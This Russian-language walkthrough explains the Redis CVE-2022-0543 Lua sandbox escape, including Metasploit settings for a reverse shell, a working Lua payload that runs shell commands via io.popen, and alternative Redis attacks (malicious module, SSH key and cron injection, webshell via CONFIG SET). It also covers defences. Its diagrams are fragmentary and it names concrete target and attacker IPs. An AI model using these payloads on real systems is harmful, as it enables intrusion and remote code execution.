## 🎯 Что такое Redis?

**Redis** (Remote Dictionary Server) - это:
- In-memory база данных (key-value хранилище)
- Очень быстрая (данные в RAM)
- Используется для кеширования, очередей, сессий
- По умолчанию слушает на порту **6379**

**Пример использования:**
```bash
# Сохранить значение
SET username "john"

# Получить значение
GET username
# Вернёт: "john"

# Список всех ключей
KEYS *
```

### Что такое CVE-2022-0543?

**CVE-2022-0543** - это критическая RCE (Remote Code Execution) уязвимость.

**Технические детали:**
- Затрагивает Redis в Debian/Ubuntu
- Проблема в Lua-песочнице (sandbox)
- Позволяет выполнить произвольный код на сервере

**Почему это опасно:**
```

┌─────────────────────────────┐
```

### Шаг 4: Настройка параметров эксплойта


**Визуализация:**
```

│ Ваш сервер               │         │ Целевой сервер           │
│ 45.140.19.200            │         │ 94.19.79.169             │
│                          │         │                          │

│ └──────────────────┘     │         │ └──────────────────┘     │
│          ↑               │         │          ↓               │
│          └───────────────┼─────────┼──────────┘               │
│       Обратное           │         │   Эксплойт               │
```

**Объяснение параметров:**

1. **RHOSTS** (Remote Hosts)
   - IP адрес цели
   - Куда отправлять эксплойт

2. **RPORT** (Remote Port)
   - Порт Redis на цели
   - Обычно 6379, но здесь 20004

3. **PASSWORD**
   - Пароль для подключения к Redis
   - `unset` = убрать, т.к. пароля нет

4. **LHOST** (Local Host)
   - Ваш IP адрес
   - Куда должен подключиться reverse shell

5. **LUA_LIB**
   - Путь к библиотеке Lua на целевом сервере
   - Нужен для эксплуатации уязвимости

6. **ForceExploit**
   - Принудительный запуск эксплойта
   - Игнорирует некоторые проверки

## 🔬 Техническая информация

### Что такое Reverse Shell?

**Обычный Shell (Normal Shell):**
```
Вы → SSH → Сервер
     (вы подключаетесь к серверу)
```

**Reverse Shell:**
```
Сервер → Подключение → Вы
     (сервер подключается к вам!)
```

**Зачем это нужно:**
- Обход файрволов (они блокируют входящие, но не исходящие)
- Не нужны учётные данные
- Скрытность

### Как работает CVE-2022-0543

**Нормальная работа Redis Lua:**
```lua
-- Безопасный код (работает в песочнице)
local result = redis.call('GET', 'mykey')
return result
```

**Эксплуатация CVE-2022-0543:**
```lua
-- Злонамеренный код (обход песочницы)
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io")
local io = io_l()
local f = io.popen("id", "r")
local res = f:read("*a")
f:close()
return res
```

**Что происходит:**
1. Загружается системная библиотека Lua
2. Получается доступ к модулю `io`
3. `io.popen` позволяет выполнять команды
4. Команды выполняются от имени пользователя `redis`

## 🛡️ Защита от этой атаки

### Что нужно было сделать:

1. **Обновить Redis**
   ```bash
   # До: Redis 5.0.7 (уязвима)
   # После: Redis 6.2.x+ (патч)
   ```

2. **Установить пароль**
   ```bash
   # redis.conf
   requirepass "сложный_пароль_123"
   ```

3. **Ограничить доступ**
   ```bash
   # redis.conf
   bind 127.0.0.1  # Только локальные подключения
   ```

4. **Файрвол**
   ```bash
   # Заблокировать порт Redis из интернета
   iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
   iptables -A INPUT -p tcp --dport 6379 -j DROP
   ```

## 🎓 Дополнительная информация

### Альтернативные методы эксплуатации Redis:

1. **RCE через модули**
   - Загрузка вредоносного .so модуля
   - `MODULE LOAD /path/to/evil.so`

2. **SSH key injection**
   - Запись SSH ключа в authorized_keys
   - Подключение по SSH

3. **Cron job injection**
   - Запись в crontab
   - Выполнение по расписанию

4. **Webshell через backup**
   - `CONFIG SET dir /var/www/html`
   - `CONFIG SET dbfilename shell.php`
   - `SAVE`
